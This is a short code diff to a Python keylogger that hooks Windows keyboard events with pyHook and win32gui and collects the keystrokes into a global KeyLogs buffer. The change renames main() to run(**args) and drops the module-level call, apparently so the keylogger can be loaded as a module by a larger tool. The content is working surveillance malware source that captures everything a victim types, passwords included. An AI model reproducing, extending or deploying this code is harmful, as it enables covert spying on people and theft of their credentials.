@@ -79,7 +79,7 @@ def KeyStroke(event):
     # pass execution to next hook registered
     return True
 
-def main():
+def run(**args):
     global KeyLogs
     # create and register a hook manager
     kl = pyHook.HookManager()
@@ -90,5 +90,3 @@ def main():
     win32gui.PumpMessages()
     
     return(KeyLogs)
-
-main()
